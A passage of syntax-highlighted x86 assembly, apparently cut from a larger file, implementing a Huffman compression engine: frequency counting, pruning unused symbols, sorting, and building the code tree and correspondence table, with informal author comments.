</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                      
</span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                                     </span><span class="sc1">; we are building a zone of</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; number of frequencie</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">; we inc table+ascii*4</span><span class="sc0">
                                                </span><span class="sc1">; each time ascii encountered</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">dictionarylookup</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;-4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1025</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;+4</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">thendontstore</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; we need to kill these that</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                      </span><span class="sc1">; happend 0 times</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">; so, put number in edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; get frequency of al</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">; if zero, kill it</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dontstoryindicotable</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">; saving it</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                   </span><span class="sc1">; next pos in table</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">dontstoryindicotable</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">dontstoryindicotable</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                   </span><span class="sc1">; get next frequecy</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                                 </span><span class="sc1">; build it</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">thendontstore</span><span class="sc0">               </span><span class="sc1">; 1024 bytes eat</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;-4</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; where we are going to</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">; put the crescendo mode</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">                       </span><span class="sc1">; but put number of entry </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">; there</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                   </span><span class="sc1">; multiply it</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; esi will become edi </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                   </span><span class="sc1">; later</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; ecx equal number of items</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">; here we go again</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; +8</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">setanynumber</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">buildarbitrarydictionaryloop1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;This operation is time critical</span><span class="sc0">
                                        </span><span class="sc1">;as 32 bit, dunno, I will may be</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;rebuild it...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;I made a fixup for large compression</span><span class="sc0">

</span><span class="sc5">checkforvalidone</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; start at zero</span><span class="sc0">

</span><span class="sc5">buildarbitrarydictionaryloop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; if eax is bigger then bybye</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">thendontsetarbitrary</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; we set frequency in eax as biggest</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; and save his location</span><span class="sc0">

</span><span class="sc5">thendontsetarbitrary</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">buildarbitrarydictionaryloop</span><span class="sc0">    </span><span class="sc1">; it's the last of the series</span><span class="sc0">
                                        </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; we get there</span><span class="sc0">
</span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">; saving everyhting</span><span class="sc0">
</span><span class="sc6">movsd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; we set before this one to zero</span><span class="sc0">
                                        </span><span class="sc1">; nothing is biggest than zero :)</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; this routine eat a lot of memory...</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">buildarbitrarydictionaryloop1</span><span class="sc0">   </span><span class="sc1">; super highway 2561 bytes eaten</span><span class="sc0">

</span><span class="sc5">thengotothere</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; -8</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">; we then set in the destination</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; number of entr</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">makethree</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; now we make a three</span><span class="sc0">
                                        </span><span class="sc1">; if ya don't understand, go read</span><span class="sc0">
                                        </span><span class="sc1">; huffman compression egine</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">512</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; +2560 bytes eaten</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">512</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; +1536 bytes eaten </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; edx contain number of </span><span class="sc0">
                                                </span><span class="sc1">; image in three</span><span class="sc0">
</span><span class="sc5">untilnothree</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; saving these value for</span><span class="sc0">
                                                </span><span class="sc1">; completing the loop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">getfromthree</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; multiply ecx by 5</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; multiply ecx by 5</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; gain of speed from slow mul/div...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy the buffer :]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; because we will operate on it</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; resent constants</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">escalator</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; we get current</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; and look if he's in the two last</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">thendontsetthebit</span><span class="sc0">               </span><span class="sc1">; object of the vertical three</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; if so, then update the current</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; value for horizontal three </span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">thendontsetthebit3</span><span class="sc0">              </span><span class="sc1">; correspondance (shift 1 + 0)</span><span class="sc0">

</span><span class="sc5">thendontsetthebit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; look if before the last...</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">thendontsetthebit2</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                              </span><span class="sc1">; shif 1 + 1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">thendontsetthebit3</span><span class="sc0">

</span><span class="sc5">thendontsetthebit3</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">thendontsetthebit2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; make fusion of last two entries</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; we get new entry</span><span class="sc0">

</span><span class="sc5">thenputloop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">thenputhere</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; then refix all the table with the</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; this value</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                           </span><span class="sc1">; repeat it</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">thenputloop</span><span class="sc0">                     </span><span class="sc1">; for every value</span><span class="sc0">

</span><span class="sc5">thenputhere</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">                 </span><span class="sc1">; this is in case of the last</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; change all the substructure</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                             </span><span class="sc1">; of the three</span><span class="sc0">

</span><span class="sc5">thenitsfinish</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                                          </span><span class="sc1">; this is for the loop</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                             
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">escalator</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; restore datas</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">; save this in the three</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">untilnothree</span><span class="sc0">                            </span><span class="sc1">; we have to do this for</span><span class="sc0">
                                                </span><span class="sc1">; each object of the three</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">; restore data for </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; encoding</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; compressing a bit the corrspondance</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; table make it working without extra</span><span class="sc0">
                                        </span><span class="sc1">; memory...</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">dicotype2</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; build a mini char/three </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; correspondance table</span><span class="sc0">
